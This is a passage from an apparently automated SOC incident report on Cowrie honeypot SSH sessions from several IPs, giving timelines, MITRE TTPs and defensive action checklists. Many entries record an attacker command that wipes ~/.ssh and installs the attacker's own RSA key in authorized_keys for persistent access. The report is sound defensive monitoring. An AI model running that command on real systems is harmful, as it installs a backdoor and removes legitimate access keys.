| `2026-04-21 05:12:19` | `cowrie.command.failed` |
| `2026-04-21 05:12:19` | `cowrie.log.closed` |
| `2026-04-21 05:12:19` | `cowrie.session.params` |
| `2026-04-21 05:12:19` | `cowrie.command.input` |
| `2026-04-21 05:12:19` | `cowrie.session.file_download` |
| `2026-04-21 05:12:19` | `cowrie.log.closed` |
| `2026-04-21 05:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b59def41af4

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:12 |
| **Last Seen** | 2026-04-21 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:12:21` | `cowrie.session.connect` |
| `2026-04-21 05:12:21` | `cowrie.client.version` |
| `2026-04-21 05:12:21` | `cowrie.client.kex` |
| `2026-04-21 05:12:22` | `cowrie.login.success` |
| `2026-04-21 05:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d4523aeac1

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:12 |
| **Last Seen** | 2026-04-21 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:12:36` | `cowrie.session.connect` |
| `2026-04-21 05:12:36` | `cowrie.client.version` |
| `2026-04-21 05:12:36` | `cowrie.client.kex` |
| `2026-04-21 05:12:37` | `cowrie.login.success` |
| `2026-04-21 05:12:37` | `cowrie.session.params` |
| `2026-04-21 05:12:37` | `cowrie.command.input` |
| `2026-04-21 05:12:37` | `cowrie.command.failed` |
| `2026-04-21 05:12:37` | `cowrie.log.closed` |
| `2026-04-21 05:12:38` | `cowrie.session.params` |
| `2026-04-21 05:12:38` | `cowrie.command.input` |
| `2026-04-21 05:12:38` | `cowrie.session.file_download` |
| `2026-04-21 05:12:38` | `cowrie.log.closed` |
| `2026-04-21 05:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88fec3df076b

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:12 |
| **Last Seen** | 2026-04-21 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:12:40` | `cowrie.session.connect` |
| `2026-04-21 05:12:40` | `cowrie.client.version` |
| `2026-04-21 05:12:40` | `cowrie.client.kex` |
| `2026-04-21 05:12:41` | `cowrie.login.success` |
| `2026-04-21 05:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d94a222f00b

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:13 |
| **Last Seen** | 2026-04-21 05:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:13:09` | `cowrie.session.connect` |
| `2026-04-21 05:13:09` | `cowrie.client.version` |
| `2026-04-21 05:13:09` | `cowrie.client.kex` |
| `2026-04-21 05:13:09` | `cowrie.login.success` |
| `2026-04-21 05:13:10` | `cowrie.session.params` |
| `2026-04-21 05:13:10` | `cowrie.command.input` |
| `2026-04-21 05:13:10` | `cowrie.command.failed` |
| `2026-04-21 05:13:10` | `cowrie.log.closed` |
| `2026-04-21 05:13:10` | `cowrie.session.params` |
| `2026-04-21 05:13:10` | `cowrie.command.input` |
| `2026-04-21 05:13:10` | `cowrie.session.file_download` |
| `2026-04-21 05:13:10` | `cowrie.log.closed` |
| `2026-04-21 05:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f7b7443fa0f

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:13 |
| **Last Seen** | 2026-04-21 05:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:13:09` | `cowrie.session.connect` |
| `2026-04-21 05:13:09` | `cowrie.client.version` |
| `2026-04-21 05:13:09` | `cowrie.client.kex` |
| `2026-04-21 05:13:10` | `cowrie.login.success` |
| `2026-04-21 05:13:10` | `cowrie.session.params` |
| `2026-04-21 05:13:10` | `cowrie.command.input` |
| `2026-04-21 05:13:10` | `cowrie.command.failed` |
| `2026-04-21 05:13:11` | `cowrie.log.closed` |
| `2026-04-21 05:13:11` | `cowrie.session.params` |
| `2026-04-21 05:13:11` | `cowrie.command.input` |
| `2026-04-21 05:13:11` | `cowrie.session.file_download` |
| `2026-04-21 05:13:11` | `cowrie.log.closed` |
| `2026-04-21 05:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85bd0d0192ba

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:13 |
| **Last Seen** | 2026-04-21 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:13:12` | `cowrie.session.connect` |
| `2026-04-21 05:13:12` | `cowrie.client.version` |
| `2026-04-21 05:13:12` | `cowrie.client.kex` |
| `2026-04-21 05:13:13` | `cowrie.login.success` |
| `2026-04-21 05:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c1f78f60c7

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:13 |
| **Last Seen** | 2026-04-21 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:13:14` | `cowrie.session.connect` |
| `2026-04-21 05:13:14` | `cowrie.client.version` |
| `2026-04-21 05:13:14` | `cowrie.client.kex` |
| `2026-04-21 05:13:15` | `cowrie.login.success` |
| `2026-04-21 05:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70852c3e529c

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:14 |
| **Last Seen** | 2026-04-21 05:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:14:11` | `cowrie.session.connect` |
| `2026-04-21 05:14:11` | `cowrie.client.version` |
| `2026-04-21 05:14:11` | `cowrie.client.kex` |
| `2026-04-21 05:14:12` | `cowrie.login.success` |
| `2026-04-21 05:14:12` | `cowrie.session.params` |
| `2026-04-21 05:14:12` | `cowrie.command.input` |
| `2026-04-21 05:14:12` | `cowrie.command.failed` |
| `2026-04-21 05:14:12` | `cowrie.log.closed` |
| `2026-04-21 05:14:12` | `cowrie.session.params` |
| `2026-04-21 05:14:12` | `cowrie.command.input` |
| `2026-04-21 05:14:12` | `cowrie.session.file_download` |
| `2026-04-21 05:14:12` | `cowrie.log.closed` |
| `2026-04-21 05:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f35b10bbf7d

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:14 |
| **Last Seen** | 2026-04-21 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:14:15` | `cowrie.session.connect` |
| `2026-04-21 05:14:15` | `cowrie.client.version` |
| `2026-04-21 05:14:15` | `cowrie.client.kex` |
| `2026-04-21 05:14:15` | `cowrie.login.success` |
| `2026-04-21 05:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98040a412b4

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:15 |
| **Last Seen** | 2026-04-21 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:15:59` | `cowrie.session.connect` |
| `2026-04-21 05:15:59` | `cowrie.client.version` |
| `2026-04-21 05:15:59` | `cowrie.client.kex` |
| `2026-04-21 05:15:59` | `cowrie.login.success` |
| `2026-04-21 05:16:00` | `cowrie.session.params` |
| `2026-04-21 05:16:00` | `cowrie.command.input` |
| `2026-04-21 05:16:00` | `cowrie.command.failed` |
| `2026-04-21 05:16:00` | `cowrie.log.closed` |
| `2026-04-21 05:16:00` | `cowrie.session.params` |
| `2026-04-21 05:16:00` | `cowrie.command.input` |
| `2026-04-21 05:16:00` | `cowrie.session.file_download` |
| `2026-04-21 05:16:00` | `cowrie.log.closed` |
| `2026-04-21 05:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8508205141a

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:16 |
| **Last Seen** | 2026-04-21 05:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:16:03` | `cowrie.session.connect` |
| `2026-04-21 05:16:03` | `cowrie.client.version` |
| `2026-04-21 05:16:03` | `cowrie.client.kex` |
| `2026-04-21 05:16:03` | `cowrie.login.success` |
| `2026-04-21 05:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d42a8be7b72

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:16 |
| **Last Seen** | 2026-04-21 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:16:33` | `cowrie.session.connect` |
| `2026-04-21 05:16:33` | `cowrie.client.version` |
| `2026-04-21 05:16:33` | `cowrie.client.kex` |
| `2026-04-21 05:16:34` | `cowrie.login.success` |
| `2026-04-21 05:16:34` | `cowrie.session.params` |
| `2026-04-21 05:16:34` | `cowrie.command.input` |
| `2026-04-21 05:16:34` | `cowrie.command.failed` |
| `2026-04-21 05:16:34` | `cowrie.log.closed` |
| `2026-04-21 05:16:35` | `cowrie.session.params` |
| `2026-04-21 05:16:35` | `cowrie.command.input` |
| `2026-04-21 05:16:35` | `cowrie.session.file_download` |
| `2026-04-21 05:16:35` | `cowrie.log.closed` |
| `2026-04-21 05:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd275936c0a

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:16 |
| **Last Seen** | 2026-04-21 05:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:16:37` | `cowrie.session.connect` |
| `2026-04-21 05:16:37` | `cowrie.client.version` |
| `2026-04-21 05:16:37` | `cowrie.client.kex` |
| `2026-04-21 05:16:38` | `cowrie.login.success` |
| `2026-04-21 05:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9010545e9321

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:17 |
| **Last Seen** | 2026-04-21 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:17:08` | `cowrie.session.connect` |
| `2026-04-21 05:17:08` | `cowrie.client.version` |
| `2026-04-21 05:17:08` | `cowrie.client.kex` |
| `2026-04-21 05:17:09` | `cowrie.login.success` |
| `2026-04-21 05:17:10` | `cowrie.session.params` |
| `2026-04-21 05:17:10` | `cowrie.command.input` |
| `2026-04-21 05:17:10` | `cowrie.command.failed` |
| `2026-04-21 05:17:10` | `cowrie.log.closed` |
| `2026-04-21 05:17:10` | `cowrie.session.params` |
| `2026-04-21 05:17:10` | `cowrie.command.input` |
| `2026-04-21 05:17:10` | `cowrie.session.file_download` |
| `2026-04-21 05:17:10` | `cowrie.log.closed` |
| `2026-04-21 05:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9358ae2263

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:17 |
| **Last Seen** | 2026-04-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:17:13` | `cowrie.session.connect` |
| `2026-04-21 05:17:13` | `cowrie.client.version` |
| `2026-04-21 05:17:13` | `cowrie.client.kex` |
| `2026-04-21 05:17:14` | `cowrie.login.success` |
| `2026-04-21 05:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b3c7a4d6df

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:18 |
| **Last Seen** | 2026-04-21 05:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:18:00` | `cowrie.session.connect` |
| `2026-04-21 05:18:00` | `cowrie.client.version` |
| `2026-04-21 05:18:00` | `cowrie.client.kex` |
| `2026-04-21 05:18:01` | `cowrie.login.success` |
| `2026-04-21 05:18:01` | `cowrie.session.params` |
| `2026-04-21 05:18:01` | `cowrie.command.input` |
| `2026-04-21 05:18:01` | `cowrie.command.failed` |
| `2026-04-21 05:18:01` | `cowrie.log.closed` |
| `2026-04-21 05:18:01` | `cowrie.session.params` |
| `2026-04-21 05:18:01` | `cowrie.command.input` |
| `2026-04-21 05:18:02` | `cowrie.session.file_download` |
| `2026-04-21 05:18:02` | `cowrie.log.closed` |
| `2026-04-21 05:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786f4dc511d5

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:18 |
| **Last Seen** | 2026-04-21 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:18:04` | `cowrie.session.connect` |
| `2026-04-21 05:18:04` | `cowrie.client.version` |
| `2026-04-21 05:18:04` | `cowrie.client.kex` |
| `2026-04-21 05:18:04` | `cowrie.login.success` |
| `2026-04-21 05:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b52be5bdbc31

